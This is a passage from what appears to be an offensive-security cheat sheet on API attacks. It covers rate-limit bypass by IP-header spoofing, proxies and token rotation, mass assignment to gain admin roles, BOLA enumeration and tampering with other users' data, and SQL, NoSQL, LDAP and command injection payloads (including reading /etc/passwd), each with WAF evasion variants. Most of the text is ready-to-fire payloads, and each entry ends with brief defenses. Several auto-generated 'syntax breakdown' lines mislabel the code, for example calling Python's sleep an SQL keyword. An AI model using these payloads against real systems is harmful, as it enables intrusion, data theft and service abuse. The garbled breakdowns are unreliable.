curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test

# Other IP headers
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# Automate
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```
**Syntax breakdown:**
- `X-Forwarded-For` — the original IP forwarded by the proxy _value_
- `X-Real-IP` — the real client IP _value_

**3. Distributed bypass**
> Distributed bypass of the rate limit
```
# Use multiple proxies
# Configure a proxy pool
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080"
]

# Python script
import requests
proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
for i, proxy in enumerate(proxies_list):
    requests.get("http://target.com/api/test", proxies={"http": proxy})

# Use Tor
# Change the Tor circuit for each request
import stem.process
import requests

# Use cloud functions
# AWS Lambda, Azure Functions, etc.
```
**Syntax breakdown:**
- `Bearer` — token type _keyword_
- `Authorization` — authentication header _header_

**4. Other bypass techniques**
> Other bypass techniques
```
# User-Agent bypass
curl -A "Googlebot" http://target.com/api/test
curl -A "Bingbot" http://target.com/api/test

# Authentication bypass
# Use different accounts
for token in $TOKENS; do
  curl -H "Authorization: Bearer $token" http://target.com/api/test
done

# HTTP/2 multiplexing
# Send multiple requests over a single connection

# Slow requests
# Slowloris attack
```
**Syntax breakdown:**
- `curl` — HTTP request tool _command_
- `-H` — custom request header _parameter_
- `Authorization` — authentication header _header_

**WAF/EDR Bypass Variants:**

**API Key rotation**
> API Key rotation
```
# Use multiple API Keys
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumerate(api_keys):
    requests.get("http://target.com/api/test", headers={"X-API-Key": key})

# Register multiple accounts to obtain multiple Tokens
```
**Syntax breakdown:**
- `# Use multiple API Keys
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumer` — attack payload _value_

**Request distribution**
> Request distribution
```
# Add a delay
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.sleep(0.5)  # 0.5 second between each request

# Distribute across different time periods
# Use scheduled tasks to distribute the requests
```
**Syntax breakdown:**
- `# Add a delay
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.` — SQL expression _value_
- `sleep` — SQL keyword _keyword_
- `(0.5)  # 0.5 second between each request

# Distribute across different time periods
# Use scheduled tasks to distribute the requests` — SQL expression _value_

**Overview:** A missing API rate limit allows an attacker to call the API endpoint without limit, leading to serious security issues such as brute force (password/OTP), bulk data scraping, resource abuse (sending a large number of SMS/emails), and denial of service.

**Vulnerability Principle:** API rate limit bypass: 1) no rate limit at all (unlimited calls) 2) IP-based limit only (change IP/use a proxy to bypass) 3) user-based limit only (create multiple accounts) 4) limit on certain endpoints only (find an unrestricted equivalent endpoint) 5) HTTP method transformation bypass (GET→POST) 6) add request parameters to bypass the signature.

**Exploitation Method:** Complete exploitation flow:
1. Detect the rate limit threshold
2. Analyze what the limit is based on (IP/user/Key)
3. Choose an appropriate bypass method
4. Execute the brute-force attack

**Defensive Measures:** Defenses:
1. Rate-limit based on a user+IP combination
2. Do not trust client IP headers
3. Use a sliding window rate limit
4. Enforce CAPTCHA
5. Monitor abnormal access patterns

---

### Mass Assignment Vulnerability  `api-mass-assignment`
_Use the mass assignment vulnerability to modify sensitive fields_
Subcategory: **Mass Assignment** · tags: `api` `mass-assignment` `privilege-escalation`

**Prerequisites:**
- The API accepts JSON input
- Unfiltered fields exist

**Attack Chain:**

**1. Identify the input fields**
> Identify the returned fields
```
# Normal request
POST /api/users
{
  "name": "test",
  "email": "test@test.com"
}

# Observe the response
{
  "id": 1,
  "name": "test",
  "email": "test@test.com",
  "role": "user",
  "isAdmin": false,
  "createdAt": "2024-01-01"
}
```
**Syntax breakdown:**
- `role` — user role field _value_
- `isAdmin` — administrator flag _value_

**2. Add sensitive fields**
> Add sensitive fields
```
# Try adding the role field
POST /api/users
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin"
}

# Try isAdmin
{
  "name": "test",
  "email": "test@test.com",
  "isAdmin": true
}

# Try multiple fields
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete"]
}
```
**Syntax breakdown:**
- `"role": "admin"` — attempt to set the administrator role _value_
- `"isAdmin": true` — attempt to set the administrator flag _value_

**3. Update operation**
> Update operation testing
```
# PUT/PATCH update
PATCH /api/users/123
{
  "role": "admin"
}

# Try modifying another user
PATCH /api/users/1
{
  "role": "admin"
}

# Try modifying the password
PATCH /api/users/me
{
  "password": "newpassword123"
}
```

**4. Nested objects**
> Nested object testing
```
# Nested object assignment
{
  "name": "test",
  "settings": {
    "notifications": true,
    "isAdmin": true
  }
}

# Array assignment
{
  "name": "test",
  "roles": ["admin", "superadmin"]
}
```

**WAF/EDR Bypass Variants:**

**Field variants**
> Try field variants
```
# Try different field names
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userType, user_type_id

# Try internal fields
__v, _id, created_at, updated_at
password_hash, passwordHash
```
**Syntax breakdown:**
- `# Try different field names
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userTyp` — attack payload _value_

**Type confusion**
> Type confusion testing
```
# Number to boolean
{"isAdmin": 1}
{"isAdmin": "true"}

# Array to string
{"roles": "admin"}

# Object to array
{"settings": ["admin"]}
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Number to boolean
{"isAdmin": 1}
{"isAdmin": "true"}

# Array to string
{"roles": "admin"}

# Object to array
{"settings": ["admin"]}` — parameters and payload content _value_

**Overview:** The Mass Assignment vulnerability occurs when the API automatically binds request parameters to a data model. An attacker submits extra fields (such as role=admin/is_verified=true) to modify attributes that should not be controlled by the user.

**Vulnerability Principle:** Mass assignment vulnerability scenarios: 1) add the role:admin field during user registration to escalate privileges 2) add balance:999999 when modifying the profile to change the balance 3) modify price:0 when creating an order to change the price 4) add is_admin:true when updating settings to gain admin permissions. The framework's auto-binding feature (such as Spring/Rails) is the root cause.

**Exploitation Method:** Complete exploitation flow:
1. Send a normal request and observe the response fields
2. Identify sensitive fields (role, isAdmin, etc.)
3. Add sensitive fields to the request
4. Verify whether the modification succeeded

**Defensive Measures:** Defenses:
1. Use a DTO (Data Transfer Object)
2. Allowlist the permitted fields
3. Configure the object mapping library
4. Validate and filter input

---

### BOLA Broken Object Level Authorization  `api-bola`
_Use the BOLA vulnerability to access unauthorized objects_
Subcategory: **BOLA** · tags: `api` `bola` `authorization` `idor`

**Prerequisites:**
- The API uses object IDs
- An authorization check flaw

**Attack Chain:**

**1. Identify object access**
> Identify the object access pattern
```
# Observe the API endpoints
GET /api/users/{user_id}/documents
GET /api/teams/{team_id}/members
GET /api/orders/{order_id}

# Analyze the object relationships
# User -> Document
# Team -> Member
# Order -> User
```
**Syntax breakdown:**
- `{user_id}` — user ID parameter _value_
- `{team_id}` — team ID parameter _value_

**2. Test authorization**
> Test the authorization check
```
# Create two accounts to test
# User A: user_a_token
# User B: user_b_token

# User A creates a resource
POST /api/documents
Authorization: Bearer user_a_token
{"title": "Secret Doc"}
# Returns: {"id": "doc_123"}

# User B attempts to access
GET /api/documents/doc_123
Authorization: Bearer user_b_token
# If it returns 200, BOLA exists
```
**Syntax breakdown:**
- `POST` — HTTP method _method_
- `Authorization` — authentication header _header_

**3. Horizontal access**
> Horizontal access testing
```
# Enumerate other users' resources
for doc_id in doc_1 doc_2 doc_3; do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
done

# Access another user's private data
GET /api/users/2/profile
GET /api/users/2/settings
GET /api/users/2/credit-cards
```
**Syntax breakdown:**
- `curl` — HTTP request tool _command_
- `-H` — custom request header _parameter_
- `Authorization` — authentication header _header_

**4. Modify/delete operations**
> Modify/delete operation testing
```
# Modify another user's data
PUT /api/documents/doc_123
Authorization: Bearer user_b_token
{"title": "Modified by B"}

# Delete another user's data
DELETE /api/documents/doc_123
Authorization: Bearer user_b_token

# Add to another team
POST /api/teams/team_1/members
Authorization: Bearer attacker_token
{"user_id": "attacker_id"}
```
**Syntax breakdown:**
- `Authorization` — authentication header _header_

**WAF/EDR Bypass Variants:**

**Path traversal**
> Path traversal bypass
```
# Path traversal access
GET /api/users/../admin
GET /api/users/..%2Fadmin

# Encoding bypass
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Path traversal access
GET /api/users/../admin
GET /api/users/..%2Fadmin

# Encoding bypass
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin` — parameters and payload content _value_

**Parameter tampering**
> Parameter tampering bypass
```
# Modify the request method
# GET to POST
POST /api/documents/doc_123

# Add a parameter
GET /api/documents/doc_123?user_id=attacker

# Modify the Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Modify the request method
# GET to POST
POST /api/documents/doc_123

# Add a parameter
GET /api/documents/doc_123?user_id=attacker

# Modify the Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>` — parameters and payload content _value_

**Overview:** BOLA (Broken Object Level Authorization) is the number one vulnerability in the OWASP API Top 10, referring to an API lacking proper authorization checks at the object level, allowing an authenticated user to access or manipulate resource objects that do not belong to them.

**Vulnerability Principle:** BOLA is closely related to IDOR but emphasizes flaws at the authorization level: 1) the API only verifies that the user is logged in but not the object ownership 2) all users' data can be obtained in bulk by iterating over IDs 3) in GraphQL, any object can be directly accessed via the node ID 4) missing authorization on associated objects (accessing another user's sub-resource).

**Exploitation Method:** Complete exploitation flow:
1. Identify APIs that use object IDs
2. Create multiple test accounts
3. Test cross-account access
4. Enumerate other objects
5. Attempt modify/delete operations

**Defensive Measures:** Defenses:
1. Enforce object-level authorization checks
2. Verify the user's ownership of the resource
3. Use unpredictable IDs
4. Log abnormal access
5. Enforce rate limiting

---

### API Injection Attack  `api-injection`
_Various injection attacks in API endpoints_
Subcategory: **API Injection** · tags: `api` `injection` `sqli` `nosqli`

**Prerequisites:**
- The API accepts user input
- The input is not correctly filtered

**Attack Chain:**

**1. SQL injection**
> API SQL injection
```
# REST API SQL injection
GET /api/users?id=1 OR 1=1
GET /api/users?name=admin'--
GET /api/users?sort=name; SELECT SLEEP(5)--

# POST request injection
POST /api/users
{"name": "admin' OR '1'='1"}

# JSON injection
POST /api/search
{"query": "test' UNION SELECT username,password FROM users--"}
```
**Syntax breakdown:**
- `OR 1=1` — SQL injection always-true condition _value_
- `UNION SELECT` — union query injection _value_

**2. NoSQL injection**
> NoSQL injection
```
# MongoDB injection
GET /api/users?name[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$ne]=user

# POST request
POST /api/login
{"username": "admin", "password": {"$ne": ""}}

{"username": "admin", "password": {"$regex": ".*"}}

# Nested query
{"$where": "this.password == this.password"}
{"$where": "return true"}
```
**Syntax breakdown:**
- `$ne` — MongoDB not-equal operator _variable_
- `$regex` — regular expression matching _variable_
- `$where` — JavaScript execution _variable_

**3. LDAP injection**
> LDAP injection
```
# LDAP injection
GET /api/users?name=*)(uid=*))(|(uid=*
GET /api/login?user=*&password=*

# Authentication bypass
POST /api/auth
{"user": "admin)(|(password=*))", "password": "x"}

# Information disclosure
GET /api/search?name=*)(objectClass=*)
```
**Syntax breakdown:**
- `*)` — LDAP close the current filter _value_
- `(uid=*)` — match all users _value_

**4. Command injection**
> Command injection
```
# OS command injection
GET /api/ping?host=127.0.0.1;id
GET /api/convert?file=test.pdf;cat /etc/passwd

# POST request
POST /api/exec
{"cmd": "ls -la; cat /etc/passwd"}

# Backtick injection
GET /api/check?host=`id`
GET /api/check?host=$(id)
```
**Syntax breakdown:**
- `;id` — execute the id command after the command separator _value_
- `` `id` `` — command substitution execution _value_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
# URL encoding
GET /api/users?id=1%20OR%201%3D1

# Unicode encoding
GET /api/users?id=1%u0020OR%u00201%3D1

# Double encoding
GET /api/users?id=1%2520OR%25201%253D1
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` URL encoding
GET /api/users?id=1%20OR%201%3D1

# Unicode encoding
GET /api/users?id=1%u0020OR%u00201%3D1

# Double encoding
GET /api/users?id=1%2520OR%25201%253D1` — parameters and payload content _value_

**Content-Type bypass**
> Content-Type bypass
```
# Switch the Content-Type
Content-Type: application/xml
<user><id>1 OR 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+OR+1=1

# JSON array
{"id": ["1", "OR", "1=1"]}
```
**Syntax breakdown:**
- `# Switch the Content-Type
Content-Type: application/xml
<user><id>1 ` — SQL expression _value_
- `OR` — SQL keyword _keyword_
- ` 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+` — SQL expression _value_
- `OR` — SQL keyword _keyword_
- `+1=1

# JSON array
{"id": ["1", "` — SQL expression _value_
- `OR` — SQL keyword _keyword_
- `", "1=1"]}` — SQL expression _value_

**Overview:** API injection attacks apply traditional injection techniques (SQL/NoSQL/OS command/LDAP, etc.) to API endpoints. JSON/XML-format input parameters, query strings, HTTP headers, and so on can all become injection points, and APIs usually lack the WAF protection of web applications.

**Vulnerability Principle:** API injection attack surface: 1) SQL/NoSQL injection in JSON parameters 2) injection in GraphQL query variables 3) header injection in the API gateway/middleware (Host/X-Forwarded-For) 4) command injection in filename/path parameters 5) LDAP/XPATH query parameter injection 6) XSS in the API response (stored).

**Exploitation Method:** Complete exploitation flow:
1. Identify input points
2. Analyze the backend tech stack
3. Choose an appropriate injection type
4. Construct an injection payload
5. Extract data or execute commands

**Defensive Measures:** Defenses:
1. Use parameterized queries
2. Input validation and allowlisting
3. Least privilege principle
4. Do not leak error messages
5. WAF protection

---
